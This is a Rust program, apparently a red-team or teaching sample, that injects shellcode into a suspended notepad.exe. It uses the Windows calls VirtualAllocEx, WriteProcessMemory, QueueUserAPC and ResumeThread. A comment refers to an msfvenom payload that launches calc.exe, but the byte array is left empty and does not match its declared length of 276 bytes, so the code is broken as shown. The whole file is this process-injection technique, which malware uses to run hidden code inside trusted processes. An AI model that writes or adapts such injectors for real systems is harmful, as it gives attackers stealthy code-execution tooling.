use std::{ffi::CString, mem, ptr::null_mut};

use windows_sys::{w, Win32::{Foundation::GetLastError, System::{Diagnostics::Debug::WriteProcessMemory, Memory::{VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READWRITE}, Threading::{CreateProcessA, QueueUserAPC, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA}}, UI::WindowsAndMessaging::{MessageBoxW, MB_ICONINFORMATION, MB_YESNO}}};

fn main() {
    unsafe{
        let mbw_result = MessageBoxW(0, w!("Apc Injection?"), w!("WARNING"), MB_YESNO|MB_ICONINFORMATION);

        if mbw_result != 6{
            std::process::exit(0);
        }
    }

    //msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let buf: [u8; 276] = [];

    let process_path = CString::new("C:/windows/system32/notepad.exe").unwrap();
    let mut startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
    let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    unsafe {
        let cp_result = CreateProcessA(
            process_path.as_ptr() as *const u8,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        );

        if cp_result != 0 {
            println!("[*] The Process id: {}",process_info.dwProcessId);
        } else {
            println!("[-] Failed to create process: {}", GetLastError());
            std::process::exit(1);
        }

        let lp_addr = VirtualAllocEx(
            process_info.hProcess,
            mem::zeroed(),
            buf.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        let wpm_result = WriteProcessMemory(
            process_info.hProcess,
            lp_addr,
            buf.as_ptr() as _,
            buf.len(),
            null_mut()
        );

        if wpm_result !=0 {
            println!("[*] The shellcode injection was successful.");
        }else{
            println!("[-] Failed to inject shellcode.");
        }


        QueueUserAPC(
            std::mem::transmute(lp_addr),
            process_info.hThread,
            0
        );

        println!("[*] Resume the thread.");
        ResumeThread(process_info.hThread);

        println!("[+] Done.");
    }

}